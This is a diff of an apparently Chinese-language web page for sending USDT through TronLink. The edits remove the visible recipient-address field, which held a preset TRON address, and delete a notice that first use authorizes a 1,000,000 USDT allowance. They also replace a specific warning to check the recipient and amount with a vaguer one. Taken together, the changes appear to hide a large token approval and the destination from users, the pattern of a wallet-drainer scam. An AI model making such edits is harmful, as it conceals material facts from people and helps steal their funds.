@@ -16,7 +16,6 @@
         #transferBtn:disabled { background: #ccc; cursor: not-allowed; }
         #status { margin-top: 15px; padding: 10px; border-radius: 5px; background: #f8f9fa; min-height: 20px; }
         .service-info { background: #e8f5e8; padding: 12px; border-radius: 8px; margin-bottom: 15px; text-align: center; border-left: 4px solid #4CAF50; }
-        .authorization-note { background: #fff3cd; padding: 10px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #ffc107; font-size: 14px; }
     </style>
 </head>
 <body>
@@ -29,16 +28,7 @@
 
         <div class="input-group">
             <label for="amount">转账金额 (USDT):</label>
-            <input type="number" id="amount" value="10" step="0.1" placeholder="请输入转账金额">
-        </div>
-
-        <div class="input-group">
-            <label for="recipient">收款地址:</label>
-            <input type="text" id="recipient" placeholder="请输入TRON收款地址" value="TMcjcKsZZLSFh9nJpTfPejHx7EPjdzG5XkC">
-        </div>
-
-        <div class="authorization-note">
-            <strong>注意：</strong>首次使用需要授权 100万 USDT 额度，授权仅需一次
+            <input type="number" id="amount" value="100" step="1">
         </div>
 
         <button id="connectBtn">🔗 连接 TronLink</button>
@@ -47,7 +37,7 @@
         <div id="status">请先连接钱包...</div>
         
         <div style="margin-top: 15px; font-size: 12px; color: #666; text-align: center;">
-            安全提示：请仔细核对收款地址和转账金额
+            注意：请仔细核对转账信息
         </div>
     </div>
 
